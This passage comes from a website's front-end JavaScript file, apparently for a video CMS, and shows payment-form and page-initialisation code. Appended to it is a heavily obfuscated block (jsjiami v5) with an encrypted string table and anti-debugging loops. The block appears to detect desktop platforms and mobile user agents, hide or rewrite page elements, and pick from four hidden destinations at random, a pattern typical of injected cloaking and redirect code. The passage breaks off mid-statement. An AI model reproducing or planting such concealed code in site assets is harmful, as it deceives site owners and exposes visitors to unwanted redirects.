						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.1.zye
 */
 
/*
 * 加密工具已经升级了一个版本，目前为 jsjiami.com.v5 ，主要加强了算法，以及防破解【绝对不可逆】配置，耶稣也无法100%还原，我说的。;
 * 已经打算把这个工具基础功能一直免费下去。还希望支持我。
 * 另外 jsjiami.com.v5 已经强制加入校验，注释可以去掉，但是 jsjiami.com.v5 不能去掉（如果你开通了VIP，可以手动去掉），其他都没有任何绑定。
 * 誓死不会加入任何后门，jsjiami JS 加密的使命就是为了保护你们的Javascript 。
 * 警告：如果您恶意去掉 jsjiami.com.v5 那么我们将不会保护您的JavaScript代码。请遵守规则
 * 新版本: https://www.jsjiami.com/ 支持批量加密，支持大文件加密，拥有更多加密。 */
 
;var encode_version = 'jsjiami.com.v5', nzljt = '__0xd7442',  __0xd7442=['w64cDA7Dp3kUwrd6w5DCt8KiH3k=','w4rCmXg=','wowucQ==','54qv5p6q5Yyo772mw6rDkeS8teWugeacoeW8k+ernu+/m+i/iuivteaXoeaOguaKjuS4j+eYi+W2vuS/vg==','5Yq16Zub54io5pyE5Y6L776bw5Vs5L6m5a2g5pyv5byw56qQ','OMOVfg==','w7DDrBVlEQ==','w73Crg3DjMKk','M8O/w4wbGQ==','XhrDqg==','wrbDvMKr','wpHDhSnCt1fDisKVw7zCjsKfXA/Csyg3','aMOnw5oJN1o5','NUrCgHTCgQTCvcKGw7fCpwZJwrrCnzJ/FcO0McO1wpMYJlrDiCdjwqvDscODwprDusOEw6EjGzYmwphUUMKgbyxGwppNw5LDmSxaIAnCpj/Cuz5nw69dP8KEwph2wqU/w7/Ch8KsVRV0wpfDh8KUw4Z8wqoOw6RSGCPClRpWw5jDjsOiOyVpwoPDmxjCjcOLw4Mrw5jCoD7DocOwwp/Cm8KDwrRB','w5vDtcK6CcO0w4tAdR5DLcOqNXHCrcK7w6vClsOpNMOaYcKdwo8aUcKZNCIOGggcw58=','w7EzwrXCg8OHXMOowqc=','wp44RxhzOsOdFAgZN8OOwqjCvcOmZGfDgirClMKoAcOifTvCnzvCnhgmS8OmZ1jDgGJlwp7DjcOLw5LDsjfCh8KPBjfCs8KFw5LCmzDDqFLCsTjDlsKZwqPDmsKIw6ICwqdRRARAU8ObWcOSEcOsMMOTwpTDgD0ewo3DjcK3w6Anwo/Cmkk2w4DDo8O2w47CpnnCp0fDpHZdwobCusKBVUTDs8OOV8KPwoA=','woFkV0VkO8OSFB5e','wpfDvVdywroMY8KFw4sVwoViK8Kiw4g5w5BqwroNwq3CnRdGw6EpRTrCl8KwwqfCi8KDfj/DrcK/BWhCw6scBHhfw5PDlMK5w5vDtWPDm1EFwojDjAnDosKIBhzCrk1SwpnDvcKeWMKPbH/Dk8OY','V2bCpUrCucKnwrYsw7Mge8KY','UyvDul3CrMOsw6xsw68wUsOAwqRiwr9Tw7nCm0bDhwRcw6kXwpTCqi8oXMOUIsKrwpLCpRVnwpgSU01Ew7Y5w4BAd8OiRsK1VmkFVDjDhcOyw6x2Z3AMYkrDrcOuP8K9wpd/wplAwqNNMC52XEds','w7zCpsOSwoDCqw==','w4rCrCvDkMK2','NigCTcOX','w7MMET/Dvw==','w755w6wlFA==','w4o5TVRiI8OV','ZiY+woRH','w7PCncOswpzCl8KQCQ==','Q37ClSvCjA==','w71Ew5Zjw6zDusOI','w4TCi3Nbcg==','Qz4KJ8KKZkU=','wrXDpcKODMOG','wpkfw6vDuMOo','wqPDk8KnwoZ4','VyHDqzbCkg==','RALDrjzCmQ==','wonCksO8byE=','cRsQTsKu','QTc9wrFmDSw=','IQPCoA3Dmw==','THLCvsOScA==','dhM2V8KV','wpBIw4U=','Ei4q','EsOWYXhF','bR3Dil7CgQ==','wo8hYHnDjQ==','YXjCrMOGRA==','w7PDig5LCMO+w5BxwpzDkGwhJxPCg8KH','w5Ydw6M8wqnCvMKOwo9yZ13Dm1PCtMONLcKEccK4FcO9wpPCtcOXwqA5Fk1Gwq7DjcOvwoc6QsOfZCzDosKqw50UHMOow7bDv8OUL3LDmsKnYcKzw7HDoMKAdkwRwpLDnMOd','FGAUwo0=','w4jDsV9tw7Q=','ennCqyg4','w5zCkX1LYA==','wopTw70Sw7g=','BzPDryvCmQ==','H8KDw7PDjsO0','T8KFYMOS','NMOOZVYv','cXHCoRTCgg==','w6HDmhNc','LcKDLcKuXg==','AgDDtC/CoQ==','wpDDrcKpJMOB','ViEAG8KE','JhXChjvDpg==','woHDs8KxCcO0w4tAdR4AFcO/MijCksKq','ISUhw5JIw4xAw75rw7cOTsOfwq/Dn3J5wq0uIcOvw6JIBicuwoTCh8KzSsOKw7zDjEPCkMK1Ix5nVWPCjQ3CnsOJJAnDhsOha8O9w5zClMKyCCFlw7TDviccMw==','w67ChcO8w6s=','ZcK/w7LCrxo=','wrvCnzwpIQ==','Tj0q','JsKLw4l9w7Q=','SMKDOUzDtw==','worDlsKMwoZ6','E8OpbVJc','bMKcOkw=','w4DDv3nCuyw=','w4LCu8Ojw7gD','eR4edcKt','RF3Clw8p','QUzChzjCjw==','w60fATPDnA==','b8Knw7TCki4=','w7HDgWjCmjM=','wpjCmAkxHQ==','wpN/w54sw4k=','QQrDnWfChw==','A8Kbw7vDo8OQ','EGARwpM5','D8ObWVFX','wothw60tw70=','Bx3DtgvCoQ==','w4dnw4t6w6Y=','w6xmw7haw7g=','w5IzXsKEwqM=','E8OdSSHDsQ==','w6HChMOTw64B','JxPDnDTCtg==','w6rDv2rCrMK9','w7LCgMOwwrrCmg==','wofCmcKWw4jCsQ==','w7TCn8Onw7YIwpE=','YcKnw6E=','w6gKCADDsnw=','w7M5fQ==','BScX','CCYW','woPDh8Kq','wqbDoMKdBcOx','HQvDsSfCvA==','ZHjCvQsU','SMK2w5/CkS0=','Bg1EBMKo','wqrDrcKv','BcKnw7w=','djcRYA==','wr/DqcK8D8Ou','H2/Ctlp+','wozCg8KOw4/Cjw==','w4bDnGzCjg/Dk8OPw6XDk8KXLArDjDA=','P8KQw5JQw4Y=','wpkpWEXDuXPCjQ==','C8OJXElS','wqZOfsKYw58=','wq5Jw6AUw44=','w70hwpnCjMK6','w4xjw7g0Nw==','w6DDqFLCmhI=','wox6woTCmMOP','CiR4AMKA','Cz5mNsKm','wpHCoyI5Ag==','w6vDgVLCkMKb','DVoswqgH','HMK2EMKFcg==','w5YEwp7CtcKJwos=','bwDDsVjCkQ==','TGfCh8OWUQ==','ew3DsFPCjMKF','BE3Cqlhd','wqPCm8KOw6LCvg==','w4tdw71Zw4Q=','XsKcBE3DsQ==','w5QOdMKGwp4=','D8KNL8KnciPDlQ==','wqjCuVvDm8OXwpoDUj0dQhHDhsKPwo/CjsO+','W2zCpgvCnA==','XnLCosOXfQ==','wohfY8Khw74=','w6XCvGlG','AsKaw7A=','wqnDkcKvwoQ=','LAlqJsKW','w5XDi3nCqAY=','w6LCsXpcQMOqDMOy','dx3DuQrCu8KADHrDiQ==','PANEPMKGw7zCmULClsOrw78=','QyUN','wrdqw6k1w7XDusOR','VQfDsg==','dTkc','f1fChynCjT7CvQ==','IcKDIg==','fsOmwqI=','Y8ORIg==','w4jDl3zCrhvDucOE','VMKQJ03DjQ==','w7HDpnI=','ejEf','wr3Cp8KY','VMOWQV1DwofDv8K3wrgF','wrZhw6w0','wrrChSEw','wq7CsH5cR8KlHcO3wowuQcKwH8OZd8OUw7XDpljDvMOMU8O9XMKrIHTDocKLwqBJw4JVRMOpwpDCnMObw4PCq8Ksw5XCliYwPcK1L8OsY0Jhwqx7WsOmaUHCkcOTwpjDlyHCrcKiQcKvw7orXsKkCHTDmRzCtsKIX3/DlGXDrsOnX3vCtcKJw4vDp8KGa8KoYMKvR8Khw60/wqrClhDDo8OjdMKLNTlIHh/DpjjDjQM7wrTDgcKHwp09wobDhSA5FDJWwqASAGHCpGHCqyjDmcKoTcOkwqxfw7XCusOlacKRDMOAw7pswoAWEMO1G0DCuMOww7bDgsOQXcK0w4x9b8OGQDZiZ8OSw7sFw6owLjlEwq8MAsKtwoHDpcKrwpvClcOXw7gyw4M=','CADCgDo=','J8OxRXcg','wo7Ck8O7ewI=','w7DCsn9R','cMKNw41Ow4Jow4LCsR4FwoTCoxXChMOGSDthw7TCijvCjsKYw44lw57Cp8Orw47Diz5rwrnCvMOtwpVTYS5XHMOPw7MtAsKGwq0jC8KTSMKpG8OAwrJhGyDDncKHwrxUw4t/woTDpcOUAFsywrk9YXQmw7NbYMOEQ8KLd8KHe8KHUsO6SEoeUcOUwonDtsObw48RM8KZWV10w5A3RHhZw51Ww6VLYTR/wrs3fMOKw5EdacKwGcOAAQ==','w6LCn8KvwplTwrNhEz/DlDHCvsKlw5IOFMKMcSfDq8KIw4TDinnCnQTCncKQBzDCoknDn8OswrRBJwTDlRRawrU=','DsKNJcKtPWU=','HAbClyrDiSBPw6vDsX8=','GMKcw6TDoMOjw7FN','w7vCq19iTA==','w4UZd2Js','wqtzw4MR','w5kpd8KkwpI=','BAd7BsKr','wqvCnMK7w4HCmg==','O2jCoHxm','w6Yqa8KG','wqzCvcKww7HCnQ==','HMOTR2VV','wp4zWA==','OCY9U8Om','w4LDuH/CnsKc','wqxrw6U/w4o=','wonChcO/bTrClH1zw6c=','Yz8wwqM/wrt8wqXDgRvDqQ==','GMKHMsKg','KcOnRwfDjMOPw40qwoDDkmnDgMOzeMOTH8OZIC5kXFgYwrDDuAPCtsKgw4MywrzDrcOew4XCsnBSXDU9wojDuGFn','IBh8I8KCwqPDhC7ClMO8w7Ruw6TDssO8w7MwaHvCmHTDnMOIVVzDih1yIjnDvEnCtcK1EcOqEAfDggzCksOKHWU=','cCwLdcKREFLCj8OzTAbDrcKXwqjClcO+w61yBntOw6ZowrcKK8OkJX/Dv3fDnS58Zj9kw7HCgURHw5fDlcOF','PMOgw5oAKAUoFMK1w5zDu8KLw69xw5MQL8KxIsK/OMOCw4E0woNQw6ZmwqtVAg9mUnXDpcKqOcKEw6QedzzClg8=','HsKDL8KwciI=','woFIf8Kpw7gv','OhDCrEvDk8KUB3fDu8KcX8K+QMK+wqHDucOx','DcKAIsKweCnDmMO8wrVyD1fClUc/wrnDjsKYYMK7worDjm3DnxzDicOO','YyrDtXbCkA==','GR/CiCrDnw==','AsKUw47DncOu','wqkCQF/Dtw==','DcOwdw==','wqtqw6k1w6vDnMOZw6s3','WSc+wqBgFQ==','UDA6wqZ3CC1V','wpVmVw==','wp/CnCQ=','ATBQL8Ofdh9uwqfCvcKvw7zCpw==','UDA6wqZ3CC1VUsOLfSkaCWlE','cSnCksKVKcOeGWIRd1USbsKRNcKZOMOkwp/Ds8KyWRkmKcKuw5kqwqXCi3LDnsOIBwzDiWgJV1hiwofCpGXCusKnwpnChRTDjsOpZ03CpAFkwo1mwrHCqMKpUg==','ccKXIEw=','N8O8w48ZNQ==','w6/DoWzCjMK4','fMK9JFDDvQ==','wrHCksOgbzg=','PTzDoxXCmw==','MWzCsFlI','SMKZRsOHVA==','w53CtjrDscKQ','VjEUwpwm','KsKpLcK8XA==','wphIwqzCn8OE','wrYvaVHDpg==','w4XCjsOtwrjCnA==','WMKPfcOVT1lq','HDbDkTDCgg==','OA8Gf8OO','w49nw5glFA==','MsKrwqXCukTDosONMsK9LU/Col/Cu8OJwrQc','JMO1w6IYFA==','NsOyQRk=','Gj48eMOf','wojChMO7fB4=','wqDCs8KXw57Ch3gBAT4=','KMO9VRg=','wpDCmcO9','fD0dcMKF','w7vCtR/Di8Kf','wpdXw7oYw58=','w4YcwpPCrsK8','IcOzW3A2HTY=','w77CoA3DksKB','VyMNIMKAZk4=','OHDCimNg','GMOXQEBJw4XDsg==','w6LCk8O2w7oWwoLDrQFL','Tm3CoMONZsKYVA==','ezcRdsKNRhg=','wr1rw6Mjw6LDmcOS','JANv','BCrDuAbCvQ==','Cy3CpwfDpQ==','JsKjB8KFbQ==','cDQ9woRV','w7TDpw9ZNw==','csKyw6DCsg==','MUnCv11j','MygeWsOo','w7AKFRM=','CMO3dA7Dmg==','w6ZHw65Gw7g=','UEjCig3Cow==','KRbDvxPCtw==','wpTCvsKQ','dsK4w7E=','54qa5p+d5Y67772QPwfkvrDlr7nmnoblvr7nqZ7vvovovq7orZrmlZfmjKzmiYjkuYHnm53ltajkvo8=','wolxw4QYw48=','w6ZCw4V9w6M=','EcO8w7cVCw==','wqUSQA==','G8K4w5A=','ZMK4w7fCvw==','fsO1U3E4HDbCkBIjwrlKw57CqMOLMcKfw5tBwq/CvmU0wpNGOMOZGlMnw4oaCSnCog0VS8KWwoZSEMKMTirDtSxuw5zChcKpw5xECcO6cBg2w4tRX8OdQG93wozCilN6w4jCqX3Cng/DkGRlwr3DpcO0w5PCvnjCosOdw6LDqQhmwoMNw7fCogfCpMOLdkx0RMOuwofCmcOZccK0w4VPw5HDrSzCvCzDhl1jFcOKRQfDpzLDgsOwQg==','I8O8Vw7Cn8Of','wpHDr8KsA8Oiw4tDckpT','w7LChsO2woHCkMKQAg==','fCLDrXrChQ==','w4PDrmXCo8Kq','Oi03TcOL','IcOrY3oQ','w5QoQFdO','e2PCtjE=','eRrDm13Cjw==','wq9dWsKiw4M=','wqxwwqrCkMOq','w53CqMOCwrnChw==','w7lew5Bg','w4LDjk7Csio=','w4Q1fMKnwrk=','w6XDvG8=','wpfCnyolDw==','FWMywqoO','wrjCvTUPNA==','asKzYMOqQw==','ZR8QH8KM','w6XCn8O1woTCiw==','VzUkwql6','w78WwpTCkcKQ','NkgrwqAv','BcKzKsK9Ug==','fHvCuhUI','ZcK/w7LCtDXDqg==','JMOwWmwr','w74lKivDhQ==','Ri0NN8KAZw==','BgrCiiTDnyE=','NMOJW2Eh','PX/CrzAg','bMOsW2Q=','w7zClSM/','wrsma8KSwrA=','bMOoTXc=','USQ6eg==','wrvDhQlY','wrTCvQPDlA==','wqjDv2zCjQ==','wrzCt2g=','wo/Dk2jCrA==','c2XCkWo=','YsKUw5hY','w67DlsKqwoQ=','US4jZw==','XizDsAM=','bsKjw6fCtk7CscOVOsOnIQvCrADDqcKYwqYLDMOdIA==','w4cNwpHCo8KnwpI=','AsKQw7nDrsO1w7U=','L8O8XRI=','fz0LQMKOTxDDhcO+XCrCusK0wr8=','aywGacKH','wqduw50Nw7XDrsOz','wrpJw5cTw6A=','SjB5a8KfD1DCi2HDjMKPw7Ydw7Z9','MsOjXx7Diw==','wrfDjcKgwp9XwrJq','wqccBV/DsmEbw7Zhw4bChcOqBiPCi1oNFQU5wpQSW0AhwrElw5Etw7XDnsOyPXLChMOuwr0Vw6nDn3DDn1duUcO0wonDm0d/wq/Dqz/CscOYw4oqWh7DnCrCk3ZgWsO9w5EdwrsqOHrDqcOrw7wGLmPCkg==','NcOuXHc8HT0=','wqnCkBNNH8Ojw5Zww5LDhA==','w5zDq1dww78JaQ==','JcKkw7DDvgDDq8KcIcOwKCHCuAPCqMKPwq1WMsOpOFR5biDCuA9Rw7ZMRsKrKlfCscKkwp0HwrDDqkHDqkTDqsONEE8Fwo09YsKtVcKgY8KSwrEWwqB0GMKLw7zDtMOAw50kwrtpw5HDq8KUwqbCg3jDiEfCmMOlwqgRO8KaPznCt1DDsRdBfMKRO8KfwqrCqsKFw4nClMKdYkfCrsONOsKGwqLCisOPF30=','THfDqhHCocO1w689','WnDCp8OKbMKYXw==','KkrChi/CgRjCtMKHwq/Ctz0Sw7LCgyUiE8OeNcOow4saCVPDlCFjwqfDrMOyw4LDrsKKwqc=','w7MdDxPDo3gT','wqkxcMKIwqTDu8KZ','KnDCkXh3w6lk','wqnDmwleXMO+w5siwpvCk11uZl3DuMKQwq/CnMKFw7XDpmx6w4jDicKnw5fDsndlw7HCtVsbF8KTwrJhw7PDgMO4HsODw7HDhsOCw4/DjExzAWvDsnXCo1nClMOMecOiI1B8AUxxOGbCvkAlEcKi','HMOeL8KJQQszw70oM8ODAA==','DMOKR0dDw4XDuQ==','T8KRIsOsaTrDlsO6wqdgPV/Cilo4wqjDi8K/e8KzwpjChinChVnCl8KCw5YITcO+LsOAZsODKGlww7nCh8O4FcKlwqvDmcOcw5vCnXDCmsOIS8KtwrrCjUnCicOJA8OawpTDsMOBwrrDmsO3wq3CsA7DgnzCgmXDm8KBwobDmn/CssOaKX3CicOwwolkw7DDsMOrGMOqw5XDi8KRworDqcKxw6zDkQjCmUvDh8K3w4vDvcK3w7pC','TzTDvA==','LR58','wrXDkcKtwo5UwrdqFDQ='];(function(_0x4eb3d4,_0x5d1eec){var _0x5ba69e=function(_0x4975df){while(--_0x4975df){_0x4eb3d4['push'](_0x4eb3d4['shift']());}};var _0x897f0d=function(){var _0x55533d={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x29aa7b,_0x513d2d,_0x599d3e,_0x52354f){_0x52354f=_0x52354f||{};var _0x5561f5=_0x513d2d+'='+_0x599d3e;var _0x1d1b8e=0x0;for(var _0x1d1b8e=0x0,_0x384632=_0x29aa7b['length'];_0x1d1b8e<_0x384632;_0x1d1b8e++){var _0x3a75e0=_0x29aa7b[_0x1d1b8e];_0x5561f5+=';\x20'+_0x3a75e0;var _0x3a2532=_0x29aa7b[_0x3a75e0];_0x29aa7b['push'](_0x3a2532);_0x384632=_0x29aa7b['length'];if(_0x3a2532!==!![]){_0x5561f5+='='+_0x3a2532;}}_0x52354f['cookie']=_0x5561f5;},'removeCookie':function(){return'dev';},'getCookie':function(_0x2d0b87,_0x2c75d3){_0x2d0b87=_0x2d0b87||function(_0x11cd4d){return _0x11cd4d;};var _0x22f230=_0x2d0b87(new RegExp('(?:^|;\x20)'+_0x2c75d3['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x54d820=function(_0x140273,_0x18077c){_0x140273(++_0x18077c);};_0x54d820(_0x5ba69e,_0x5d1eec);return _0x22f230?decodeURIComponent(_0x22f230[0x1]):undefined;}};var _0x312546=function(){var _0x4c7b29=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4c7b29['test'](_0x55533d['removeCookie']['toString']());};_0x55533d['updateCookie']=_0x312546;var _0x3586bb='';var _0x2d9a9e=_0x55533d['updateCookie']();if(!_0x2d9a9e){_0x55533d['setCookie'](['*'],'counter',0x1);}else if(_0x2d9a9e){_0x3586bb=_0x55533d['getCookie'](null,'counter');}else{_0x55533d['removeCookie']();}};_0x897f0d();}(__0xd7442,0x9d));var _0x4183=function(_0x2db5a5,_0x397359){_0x2db5a5=_0x2db5a5-0x0;var _0x20c160=__0xd7442[_0x2db5a5];if(_0x4183['initialized']===undefined){(function(){var _0x338263=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x3f9775='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x338263['atob']||(_0x338263['atob']=function(_0x5ef817){var _0x3169b7=String(_0x5ef817)['replace'](/=+$/,'');for(var _0x3fe7a8=0x0,_0x12099e,_0x4a5a4e,_0x29048d=0x0,_0x470294='';_0x4a5a4e=_0x3169b7['charAt'](_0x29048d++);~_0x4a5a4e&&(_0x12099e=_0x3fe7a8%0x4?_0x12099e*0x40+_0x4a5a4e:_0x4a5a4e,_0x3fe7a8++%0x4)?_0x470294+=String['fromCharCode'](0xff&_0x12099e>>(-0x2*_0x3fe7a8&0x6)):0x0){_0x4a5a4e=_0x3f9775['indexOf'](_0x4a5a4e);}return _0x470294;});}());var _0x136924=function(_0x43cd61,_0x546a3d){var _0x2b6977=[],_0x4e7bc7=0x0,_0xad4bdb,_0x2caeb2='',_0x427267='';_0x43cd61=atob(_0x43cd61);for(var _0x559e97=0x0,_0x2d9c1a=_0x43cd61['length'];_0x559e97<_0x2d9c1a;_0x559e97++){_0x427267+='%'+('00'+_0x43cd61['charCodeAt'](_0x559e97)['toString'](0x10))['slice'](-0x2);}_0x43cd61=decodeURIComponent(_0x427267);for(var _0x59db22=0x0;_0x59db22<0x100;_0x59db22++){_0x2b6977[_0x59db22]=_0x59db22;}for(_0x59db22=0x0;_0x59db22<0x100;_0x59db22++){_0x4e7bc7=(_0x4e7bc7+_0x2b6977[_0x59db22]+_0x546a3d['charCodeAt'](_0x59db22%_0x546a3d['length']))%0x100;_0xad4bdb=_0x2b6977[_0x59db22];_0x2b6977[_0x59db22]=_0x2b6977[_0x4e7bc7];_0x2b6977[_0x4e7bc7]=_0xad4bdb;}_0x59db22=0x0;_0x4e7bc7=0x0;for(var _0x3c1e15=0x0;_0x3c1e15<_0x43cd61['length'];_0x3c1e15++){_0x59db22=(_0x59db22+0x1)%0x100;_0x4e7bc7=(_0x4e7bc7+_0x2b6977[_0x59db22])%0x100;_0xad4bdb=_0x2b6977[_0x59db22];_0x2b6977[_0x59db22]=_0x2b6977[_0x4e7bc7];_0x2b6977[_0x4e7bc7]=_0xad4bdb;_0x2caeb2+=String['fromCharCode'](_0x43cd61['charCodeAt'](_0x3c1e15)^_0x2b6977[(_0x2b6977[_0x59db22]+_0x2b6977[_0x4e7bc7])%0x100]);}return _0x2caeb2;};_0x4183['rc4']=_0x136924;_0x4183['data']={};_0x4183['initialized']=!![];}var _0x3c204c=_0x4183['data'][_0x2db5a5];if(_0x3c204c===undefined){if(_0x4183['once']===undefined){var _0x43b1d2=function(_0x1e0993){this['rc4Bytes']=_0x1e0993;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x43b1d2['prototype']['checkState']=function(){var _0x932c9b=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x932c9b['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x43b1d2['prototype']['runState']=function(_0x475cf9){if(!Boolean(~_0x475cf9)){return _0x475cf9;}return this['getState'](this['rc4Bytes']);};_0x43b1d2['prototype']['getState']=function(_0x4a3fa2){for(var _0x45512b=0x0,_0x56ce94=this['states']['length'];_0x45512b<_0x56ce94;_0x45512b++){this['states']['push'](Math['round'](Math['random']()));_0x56ce94=this['states']['length'];}return _0x4a3fa2(this['states'][0x0]);};new _0x43b1d2(_0x4183)['checkState']();_0x4183['once']=!![];}_0x20c160=_0x4183['rc4'](_0x20c160,_0x397359);_0x4183['data'][_0x2db5a5]=_0x20c160;}else{_0x20c160=_0x3c204c;}return _0x20c160;};var _0x20d929={'win':![],'mac':![],'xll':![]};var _0x1050f3=navigator[_0x4183('0x0','FvAk')];var _0x55ac4e=navigator[_0x4183('0x1','M^V(')][_0x4183('0x2','*F[W')]();_0x20d929[_0x4183('0x3','Lsu0')]=_0x1050f3[_0x4183('0x4','jzpq')](_0x4183('0x5','M^V('))==0x0;_0x20d929[_0x4183('0x6','@dst')]=_0x1050f3[_0x4183('0x7','KQkn')](_0x4183('0x8','Iq2L'))==0x0;_0x20d929[_0x4183('0x9','@]pB')]=_0x1050f3==_0x4183('0xa','fY12')||_0x1050f3[_0x4183('0xb','Ghea')](_0x4183('0xc','z(S!'))==0x0;if(_0x20d929[_0x4183('0xd','9xMi')]||_0x20d929[_0x4183('0xe','SZR%')]||_0x20d929[_0x4183('0xf','3Lbw')]){var _0x4cfe52=_0x4183('0x10','z@SF');$(_0x4183('0x11','jzpq'))[_0x4183('0x12','W!&n')](_0x4183('0x13','FvAk'));$(_0x4183('0x14','^6H^'))[_0x4183('0x15','QMTk')]();$(document)[_0x4183('0x16','GgDq')](function(){var _0x149652={'ivDJj':function _0x144b15(_0x2607b3,_0x29984d){return _0x2607b3(_0x29984d);},'xRSBk':_0x4183('0x17','FvAk'),'LksUZ':function _0x35c89a(_0x123589,_0x1df635){return _0x123589+_0x1df635;},'nWOzm':_0x4183('0x18','Q3(C'),'fjXpt':_0x4183('0x19','EUUE'),'gkiVs':_0x4183('0x1a','Iq2L'),'GjsDK':_0x4183('0x1b','^6H^'),'DwcgP':_0x4183('0x1c','DDR!')};_0x149652[_0x4183('0x1d','FvAk')]($,_0x149652[_0x4183('0x1e','VM$n')])[_0x4183('0x1f','dBWK')](_0x149652[_0x4183('0x20','h9VM')](_0x149652[_0x4183('0x21','*F[W')](_0x149652[_0x4183('0x22','3Lbw')],_0x4cfe52),_0x149652[_0x4183('0x23','HCmz')]))[_0x4183('0x24','h9VM')]();_0x149652[_0x4183('0x25','3Lbw')]($,_0x149652[_0x4183('0x26','z@SF')])[_0x4183('0x27','cGFM')](_0x149652[_0x4183('0x28','78)m')],_0x149652[_0x4183('0x29','9xMi')]);});}setInterval(function(){var _0x1acc57={'olKBS':function _0x59d28d(_0x3fb07d){return _0x3fb07d();}};_0x1acc57[_0x4183('0x2a','dBWK')](_0x1d3ec5);},0xfa0);var _0x7e41d=navigator[_0x4183('0x2b','GgDq')][_0x4183('0x2c','SZR%')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0x4183('0x2d','Iq2L')](_0x7e41d);var _0x236c52=new Array(_0x4183('0x2e','2^yo'),_0x4183('0x2f','*F[W'),_0x4183('0x30','@dst'),_0x4183('0x31','HuWT'));var _0x17e899;_0x17e899=_0x236c52[parseInt(Math[_0x4183('0x32','Iq2L')]()*_0x236c52[_0x4183('0x33','41Ft')])];function _0x5603f4(_0x1af529){var _0x516850={'jFkAs':_0x4183('0x34','L[r$'),'laYTo':function _0x5a8c0a(_0x8adefe){return _0x8adefe();},'TBkjb':function _0x4bd197(_0x902d0a,_0xc5d164,_0xb0de1a){return _0x902d0a(_0xc5d164,_0xb0de1a);},'iQkiO':_0x4183('0x35','Iq2L'),'olaHD':function _0x209571(_0x241e49,_0x1bf838){return _0x241e49<_0x1bf838;},'zJLLC':function _0x478933(_0x14e0c5,_0x1747bb){return _0x14e0c5*_0x1747bb;},'vUnbx':function _0x5d7c24(_0x4c2f6c,_0x27e7bd){return _0x4c2f6c||_0x27e7bd;}};var _0xa7786b=_0x516850[_0x4183('0x36','L[r$')][_0x4183('0x37','^6H^')]('|'),_0x16ad6f=0x0;while(!![]){switch(_0xa7786b[_0x16ad6f++]){case'0':_0x516850[_0x4183('0x38','DDR!')](_0x1c4647);continue;case'1':return _0x5a13b7;case'2':var _0x1c4647=_0x516850[_0x4183('0x39','cGFM')](_0x141118,this,function(){var _0x1ed02f={'dDmhH':function _0x361567(_0x4610f2,_0x1d2daa){return _0x4610f2===_0x1d2daa;},'MdzpC':_0x4183('0x3a','2^yo'),'lnHUZ':function _0x4a4b86(_0x318acb,_0x3aabcc){return _0x318acb!==_0x3aabcc;},'syUat':_0x4183('0x3b','jzpq'),'GsUVv':function _0x5bfb5f(_0x570464,_0x53c560){return _0x570464===_0x53c560;},'AahPn':_0x4183('0x3c','W#!0'),'FKlhA':function _0xd98df5(_0x333f82,_0x3a6a5e){return _0x333f82===_0x3a6a5e;},'UTjhz':_0x4183('0x3d','W#!0'),'KoBds':function _0x40d0d5(_0xb2518d,_0x514e61){return _0xb2518d===_0x514e61;},'GCHhc':_0x4183('0x3e','41Ft'),'BnXit':_0x4183('0x3f','W!&n'),'TPTeF':_0x4183('0x40','Lsu0'),'aBCDN':_0x4183('0x41','W#!0'),'JAFQp':_0x4183('0x42','UMoT'),'FqiAV':function _0x5142e1(_0x2cd4e0,_0x41894f){return _0x2cd4e0(_0x41894f);},'aXoqK':_0x4183('0x43','z(S!'),'lKGQq':function _0x4d5b0c(_0x511666,_0x5428f4){return _0x511666+_0x5428f4;},'LdPME':_0x4183('0x44','HuWT'),'IdGye':function _0x5b07a0(_0x1da36c,_0x12d028){return _0x1da36c+_0x12d028;},'lqQQq':_0x4183('0x45','9xMi'),'YNfvo':function _0x473fae(_0x350850){return _0x350850();}};if(_0x1ed02f[_0x4183('0x46','z(S!')](_0x1ed02f[_0x4183('0x47','GgDq')],_0x1ed02f[_0x4183('0x48','UqoZ')])){var _0x360c31=function(){};var _0x367fe9=_0x1ed02f[_0x4183('0x49','HCmz')](typeof window,_0x1ed02f[_0x4183('0x4a','fY12')])?window:_0x1ed02f[_0x4183('0x4b','!Ida')](typeof process,_0x1ed02f[_0x4183('0x4c','SZR%')])&&_0x1ed02f[_0x4183('0x4d','Iq2L')](typeof 